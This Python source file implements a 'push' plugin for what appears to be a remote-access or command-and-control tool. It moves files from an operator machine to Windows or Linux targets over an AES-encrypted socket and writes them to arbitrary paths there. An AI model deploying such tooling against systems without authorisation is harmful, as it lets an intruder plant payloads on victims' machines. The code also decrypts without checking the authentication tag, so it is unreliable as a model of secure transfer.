from Crypto.Cipher import AES
from .interfaces import CommandPlugin
import os
import pathlib
import tqdm

class PushCommand(CommandPlugin):
    def handler(argv, socket, cipherKey):
        """Send a file to target host"""
        try:
            command, operatorPath, targetPath = argv
        except Exception as e:
            # Error: couldn't parse command -- terminate command
            return
        # expand '..', '.', and '~' to full path
        p = pathlib.Path(operatorPath)
        operatorPath = str(p.resolve())
        # make sure path points to an existing file
        if os.path.isdir(operatorPath) or not p.exists():
            print("Error: operator path does not exist or is a directory")
            # send error message to target and terminate command
            cipher = AES.new(cipherKey, AES.MODE_EAX)
            nonce = cipher.nonce
            ciphertext, tag = cipher.encrypt_and_digest("operator path does not exist or is a directory".encode())
            socket.sendall(nonce)
            socket.sendall(tag)
            socket.sendall(ciphertext)
            return
        # wait for ready signal
        nonce = socket.recv(16)
        tag = socket.recv(16)
        ciphertext = socket.recv(2048)
        cipher = AES.new(cipherKey, AES.MODE_EAX, nonce=nonce)
        signal = cipher.decrypt(ciphertext)
        if signal.decode() != "READY":
            print("Warning: ready signal garbled in transit")
        # send file size
        filesize = os.path.getsize(operatorPath)
        cipher = AES.new(cipherKey, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(str(filesize).encode())
        socket.sendall(nonce)
        socket.sendall(tag)
        socket.sendall(ciphertext)
        # wait for ready signal
        nonce = socket.recv(16)
        tag = socket.recv(16)
        ciphertext = socket.recv(2048)
        cipher = AES.new(cipherKey, AES.MODE_EAX, nonce=nonce)
        signal = cipher.decrypt(ciphertext)
        if signal.decode() != "READY":
            print("Warning: ready signal garbled in transit")
        # send file
        progress = tqdm.tqdm(range(filesize), "Sending file", unit="B", unit_scale=True, unit_divisor=1024)
        with open(operatorPath, "rb") as pullFile:
            while True:
                bytesRead = pullFile.read(2048)
                if not bytesRead:
                    # done sending file
                    break
                # send file chunk
                cipher = AES.new(cipherKey, AES.MODE_EAX)
                nonce = cipher.nonce
                ciphertext, tag = cipher.encrypt_and_digest(bytesRead)
                socket.sendall(nonce)
                socket.sendall(tag)
                socket.sendall(ciphertext)
                progress.update(len(bytesRead))
                if progress.n >= filesize:
                    # done sending file
                    progress.close()
                    break
        print("Done.")
        # file sent
        return

    def target(argv, socket, cipherKey):
        """Receive file from operator (platform-agnostic)"""
        try:
            command, operatorPath, targetPath = argv
        except:
            # Error: couldn't parse command. Please check args and try again
            return
        # expand '..', '.', and '~' to full path and remove trailing /'s
        p = pathlib.Path(targetPath)
        targetPath = str(p.resolve())
        # get name of file to be saved
        shortname, nameFromOperator = PushCommand.getShortname(operatorPath, targetPath)
        # send ready-to-receive signal
        cipher = AES.new(cipherKey, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(b"READY")
        socket.sendall(nonce)
        socket.sendall(tag)
        socket.sendall(ciphertext)
        # receive file size
        nonce = socket.recv(16)
        tag = socket.recv(16)
        ciphertext = socket.recv(46)
        cipher = AES.new(cipherKey, AES.MODE_EAX, nonce=nonce)
        message = cipher.decrypt(ciphertext)
        try:
            filesize = int(message)
        except ValueError:
            print("Error message from operator: '{errorMessage}'. Please check args and try again")
            return
        # make directories that don't exist yet and open file for receiving
        if nameFromOperator:
            try:
                os.makedirs(targetPath)
            except FileExistsError:
                pass
            pulledFile = open(targetPath + "/" + shortname, "wb")
        else:
            try:
                if "/" in targetPath or "\\" in targetPath:
                    os.makedirs(targetPath[:targetPath.rindex(shortname)])
            except FileExistsError:
                pass
            pulledFile = open(targetPath, "wb")
        # send ready-to-receive signal
        cipher = AES.new(cipherKey, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(b"READY")
        socket.sendall(nonce)
        socket.sendall(tag)
        socket.sendall(ciphertext)
        # start receiving file
        progress = 0
        while True:
            # receive file chunk (up to 2KB at a time)
            buffersize = min(2048, filesize-progress)
            nonce = socket.recv(16)
            tag = socket.recv(16)
            ciphertext = socket.recv(buffersize)
            # make sure we received full ciphertext
            remaining = buffersize - len(ciphertext)
            while remaining:
                moreCiphertext = socket.recv(remaining)
                ciphertext += moreCiphertext
                remaining = buffersize - len(ciphertext)
            # decrypt chunk and save to file
            cipher = AES.new(cipherKey, AES.MODE_EAX, nonce=nonce)
            bytesRead = cipher.decrypt(ciphertext)
            pulledFile.write(bytesRead)
            progress += len(bytesRead)
            if progress >= filesize:
                # done receiving file
                break
        # file received
        pulledFile.close()
        return

    def getShortname(operatorPath, targetPath):
        """Parse paths to determine short name of file being saved"""
        fromOperator = False
        # don't check if path is directory if call is recursive
        if operatorPath != targetPath:
            # if targetPath is a directory, get file name from operatoPath
            if os.path.isdir(targetPath):
                shortname, _ = PushCommand.getShortname(operatorPath, operatorPath)
                fromOperator = True
                return (shortname, fromOperator)
        # cut file name out of full path
        if "/" in targetPath:
            shortname = targetPath[targetPath.rindex("/"):]
        elif "\\" in targetPath:
            shortname = targetPath[targetPath.rindex("\\"):]
        else:
            shortname = targetPath
        return (shortname, fromOperator)

    def windowsTarget(argv, socket, cipherKey):
        """Call platform-agnostic function to receive a file from operator host"""
        PushCommand.target(argv, socket, cipherKey)
        return

    def linuxTarget(argv, socket, cipherKey):
        """Call platform-agnostic function to receive a file from operator host"""
        PushCommand.target(argv, socket, cipherKey)
        return

    def name():
        return "push"
